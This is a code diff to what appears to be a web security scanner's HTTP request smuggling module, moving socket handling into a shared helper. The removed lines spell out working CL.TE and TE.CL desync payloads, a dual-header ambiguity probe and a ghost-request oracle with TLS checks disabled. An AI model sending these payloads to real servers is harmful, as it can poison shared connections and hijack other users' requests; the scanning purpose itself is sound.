@@ -21,6 +21,7 @@ import socket
 import ssl
 from urllib.parse import urlparse
 
+from core import http_smuggle
 from modules.base import BaseModule
 from tools.external import smuggler_scan, tool_available
 
@@ -127,189 +128,37 @@ class HTTPSmuggling(BaseModule):
         return cfg if isinstance(cfg, dict) else {}
 
     def _connection(self, url: str, timeout: int = 15, alpn=None):
-        """One raw connection, plain or TLS. http.client sends both
-        Content-Length and Transfer-Encoding as written — no
-        normalization — which is exactly what the oracle needs."""
-        parsed = urlparse(url)
-        use_tls = (parsed.scheme or "http").lower() == "https"
-        host = parsed.hostname or ""
-        port = parsed.port or (443 if use_tls else 80)
-        if use_tls:
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            if alpn:
-                context.set_alpn_protocols(list(alpn))
-            raw = socket.create_connection((host, port), timeout=timeout)
-            sock = context.wrap_socket(raw, server_hostname=host)
-            if alpn and sock.selected_alpn_protocol() not in alpn:
-                sock.close()
-                raise OSError("ALPN did not negotiate " + ",".join(alpn))
-        else:
-            sock = socket.create_connection((host, port), timeout=timeout)
-        sock.settimeout(timeout)
-        return sock, host
+        """One raw connection, plain or TLS (shared with the action)."""
+        return http_smuggle.connection(url, timeout=timeout, alpn=alpn)
 
     @staticmethod
     def _read_response(sock, timeout: int = 10) -> tuple:
-        """Read one full HTTP response (head + declared body) off a socket.
-
-        Consuming the body matters: leftover bytes would parse as a phantom
-        extra response on the next read, and phantom responses are exactly
-        what this oracle counts.
-        """
-        sock.settimeout(timeout)
-        data = b""
-        try:
-            while b"\r\n\r\n" not in data and b"\n\n" not in data:
-                chunk = sock.recv(4096)
-                if not chunk:
-                    break
-                data += chunk
-                if len(data) > 65536:
-                    break
-        except (socket.timeout, OSError):
-            pass
-        text = data.decode("utf-8", errors="replace")
-        match = re.search(r"HTTP/\d(?:\.\d)?\s+(\d{3})", text)
-        status = int(match.group(1)) if match else 0
-        length_match = re.search(r"content-length:\s*(\d+)", text, re.I)
-        if length_match and status:
-            want = int(length_match.group(1))
-            sep = re.search(r"\r\n\r\n|\n\n", text)
-            have = len(data) - (sep.end() if sep else len(data))
-            try:
-                while have < want:
-                    chunk = sock.recv(min(4096, want - have))
-                    if not chunk:
-                        break
-                    data += chunk
-                    have += len(chunk)
-            except (socket.timeout, OSError):
-                pass
-            text = data.decode("utf-8", errors="replace")
-        return status, text
+        """Read one full HTTP response off a socket (shared with the action)."""
+        return http_smuggle.read_response(sock, timeout=timeout)
 
     async def _ambiguous(self, target: str) -> tuple:
         """Does the server accept dual Content-Length + Transfer-Encoding?
 
         A 400/501 rejection means strict parsing: smuggling through header
-        ambiguity is off the table and running the fuzzer only produces
-        noise. Returns (ambiguous, note). Runs in a thread: raw sockets
-        block.
+        ambiguity is off the table and running the fuzzer only produces noise.
+        Returns (ambiguous, note).
         """
-        import asyncio as _asyncio
-
-        def probe() -> tuple:
-            try:
-                sock, host = self._connection(target, timeout=12)
-            except OSError as exc:
-                return False, f"connect failed: {exc}"
-            try:
-                body = (f"POST {urlparse(target).path or '/'} HTTP/1.1\r\n"
-                        f"Host: {host}\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n"
-                        "Content-Length: 7\r\n"
-                        "Transfer-Encoding: chunked\r\n"
-                        "Connection: close\r\n\r\n"
-                        "0\r\n\r\n")
-                sock.sendall(body.encode())
-                status, _ = self._read_response(sock, timeout=10)
-            except OSError as exc:
-                return False, f"probe failed: {exc}"
-            finally:
-                try:
-                    sock.close()
-                except OSError:
-                    pass
-            if status in (400, 501, 505):
-                return False, f"strict rejection (HTTP {status})"
-            if status == 0:
-                return False, "no response"
-            return True, f"accepted dual headers (HTTP {status})"
-
-        return await _asyncio.to_thread(probe)
+        return await http_smuggle.probe_ambiguity(target)
 
     @staticmethod
-    def _smuggle_prefix(mode: str, host: str, path: str,
-                        marker: str) -> str:
-        if mode == "te_cl":
-            # Front end frames by chunked (sees the zero chunk and treats
-            # the tail as the next request); back end frames by the 6-byte
-            # Content-Length, eating `0\r\n\r\nG` and leaving a complete
-            # `POST /<marker>` request for the socket.
-            return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
-                    "Content-Type: application/x-www-form-urlencoded\r\n"
-                    "Content-Length: 6\r\n"
-                    "Transfer-Encoding: chunked\r\n"
-                    "Connection: keep-alive\r\n\r\n"
-                    "0\r\n\r\n"
-                    f"GPOST /{marker} HTTP/1.1\r\nHost: {host}\r\n"
-                    "Content-Length: 5\r\n\r\n"
-                    "x=1\r\n\r\n")
-        return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
-                "Content-Type: application/x-www-form-urlencoded\r\n"
-                "Content-Length: 4\r\n"
-                "Transfer-Encoding: chunked\r\n"
-                "Connection: keep-alive\r\n\r\n"
-                "5c\r\n"
-                f"GPOST /{marker} HTTP/1.1\r\n"
-                "Content-Type: application/x-www-form-urlencoded\r\n"
-                "Content-Length: 15\r\n\r\n"
-                "x=1\r\n"
-                "0\r\n\r\n")
+    def _smuggle_prefix(mode: str, host: str, path: str, marker: str) -> str:
+        return http_smuggle.smuggle_prefix(mode, host, path, marker)
 
     async def _desync_oracle(self, target: str, mode: str = "cl_te") -> bool:
         """Desync proof on one socket, for one framing disagreement.
 
-        CL.TE: a front end that frames by Content-Length forwards a
-        fragment the back end re-parses as a request start. TE.CL: a front
-        end that frames by chunked lets a chunk tail through that the back
-        end (keeping Content-Length) reads as a request. Either way a
-        `GET|POST /<random-404>` ghost surfaces where the real second
-        response should be — a desync, not a guess.
+        Delegates the wire dance to `core.http_smuggle` and keeps the module's
+        evidence/finding contract: only a ghost that answers as its own request
+        (or more responses than requests) is filed as confirmed.
         """
-        import asyncio as _asyncio
-
-        marker = f"hopefully404-{secrets.token_hex(4)}"
-
-        def probe() -> tuple:
-            try:
-                sock, host = self._connection(target, timeout=20)
-            except OSError as exc:
-                return False, f"connect failed: {exc}"
-            try:
-                path = urlparse(target).path or "/"
-                prefix = self._smuggle_prefix(mode, host, path, marker)
-                normal = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
-                          "Connection: close\r\n\r\n")
-                sock.sendall(prefix.encode() + normal.encode())
-                first = self._read_response(sock, timeout=12)
-                second = self._read_response(sock, timeout=12)
-                third = self._read_response(sock, timeout=6)
-            except OSError as exc:
-                return False, f"socket failed: {exc}"
-            finally:
-                try:
-                    sock.close()
-                except OSError:
-                    pass
-            responses = [first, second, third]
-            texts = " ".join(text for _, text in responses)
-            if marker in texts:
-                return True, "smuggled prefix answered as its own request"
-            answered = [(status, text[:120]) for status, text in responses
-                        if status]
-            if len(answered) >= 3:
-                return True, f"{len(answered)} responses for 2 requests"
-            return False, f"responses: {[status for status, _ in answered]}"
-
-        try:
-            proven, note = await _asyncio.wait_for(
-                _asyncio.to_thread(probe), timeout=60)
-        except Exception as exc:
-            self.log(f"  desync oracle failed for {target}: {exc}")
-            return False
+        proven, note, marker = await http_smuggle.desync_probe(
+            target, mode, connect=self._connection,
+            read=self._read_response)
         label = "TE.CL" if mode == "te_cl" else "CL.TE"
         evidence_id = self.state.add_evidence(
             self.id, f"{mode}_desync_oracle", target,
